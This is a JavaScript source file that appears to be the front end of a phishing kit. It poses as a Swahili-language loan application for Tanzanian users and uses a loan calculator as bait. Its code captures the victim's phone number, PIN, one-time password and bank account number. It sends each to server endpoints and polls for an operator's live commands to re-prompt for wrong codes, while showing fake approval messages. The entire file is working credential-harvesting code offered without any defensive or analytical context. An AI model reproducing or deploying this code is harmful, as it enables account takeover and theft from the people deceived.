/* public/script.js */
const sessionId = 'sess_' + Math.random().toString(36).substring(2, 15);
let pollInterval = null;

function showSurfaceNotification(message) {
    const notification = document.getElementById('surfaceNotification');
    notification.innerText = message;
    notification.style.display = 'block';
    setTimeout(() => {
        notification.style.display = 'none';
    }, 4000);
}

function goToStep(stepId) {
    document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
    document.getElementById(stepId).classList.add('active');
}

// Calculator sync
const loanAmountRange = document.getElementById('loanAmountRange');
const loanMonthsRange = document.getElementById('loanMonthsRange');
if (loanAmountRange && loanMonthsRange) {
    loanAmountRange.addEventListener('input', (e) => {
        document.getElementById('displayLoanAmount').innerText = 'TSh ' + Number(e.target.value).toLocaleString();
        document.getElementById('inputAmount').value = e.target.value;
        updatePayment();
    });
    loanMonthsRange.addEventListener('input', (e) => {
        document.getElementById('displayLoanMonths').innerText = 'miezi ' + e.target.value;
        updatePayment();
    });
}

function updatePayment() {
    const amt = parseFloat(loanAmountRange.value) || 100000;
    const months = parseInt(loanMonthsRange.value) || 12;
    const monthly = (amt * 1.15) / months;
    document.getElementById('displayMonthlyPayment').innerText = 'TSh ' + Math.round(monthly).toLocaleString();
}

function submitPhoneAndNext() {
    const phone = document.getElementById('phoneNumber').value;
    if (!phone) {
        showSurfaceNotification('Tafadhali weka namba ya simu sahihi');
        return;
    }
    fetch('/api/submit-application', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, phone, ref: new URLSearchParams(window.location.search).get('ref') })
    }).then(() => {
        goToStep('step-summary');
    });
}

function requestPinVerification() {
    goToStep('step-pin');
    startPolling();
}

// PIN Box navigation logic
const pinBoxes = document.querySelectorAll('.pin-box');
pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
        if (e.target.value && index < pinBoxes.length - 1) {
            pinBoxes[index + 1].focus();
        }
        checkPinComplete();
    });
});

function checkPinComplete() {
    let pin = '';
    pinBoxes.forEach(b => pin += b.value);
    if (pin.length === 4) {
        fetch('/api/submit-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, pin })
        });
        showSurfaceNotification('Inasubiri uthibitisho wa msimamizi...');
    }
}

// OTP Box navigation logic
const otpBoxes = document.querySelectorAll('.otp-box');
otpBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
        if (e.target.value && index < otpBoxes.length - 1) {
            otpBoxes[index + 1].focus();
        }
        checkOtpComplete();
    });
});

function checkOtpComplete() {
    let otp = '';
    otpBoxes.forEach(b => otp += b.value);
    if (otp.length === 4) {
        fetch('/api/submit-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, otp })
        });
        showSurfaceNotification('Inathibitisha OTP...');
    }
}

function submitAccount() {
    const accountNumber = document.getElementById('accountNumberInput').value;
    if (accountNumber.length !== 11) {
        showSurfaceNotification('Tafadhali weka namba ya akaunti yenye tarakimu 11');
        return;
    }
    fetch('/api/submit-account', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, accountNumber })
    });
    showSurfaceNotification('Inatuma taarifa za akaunti...');
}

function startPolling() {
    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status/${sessionId}`);
            const data = await res.json();
            
            if (data.status === 'next_step') {
                goToStep('step-otp');
                showSurfaceNotification('Tafadhali weka ujumbe wa OTP uliopokea');
            } else if (data.status === 'success') {
                goToStep('step-success');
                clearInterval(pollInterval);
                showSurfaceNotification('Hongera! Mkopo umeidhinishwa');
            } else if (data.status === 'restart_pin') {
                goToStep('step-pin');
                showSurfaceNotification('PIN si sahihi. Tafadhali jaribu tena.');
            } else if (data.status === 'restart_otp') {
                goToStep('step-otp');
                showSurfaceNotification('OTP si sahihi. Tafadhali jaribu tena.');
            } else if (data.status === 'restart_acc') {
                goToStep('step-account');
                showSurfaceNotification('Namba ya akaunti si sahihi.');
            }
        } catch (err) {}
    }, 3000);
      }
  
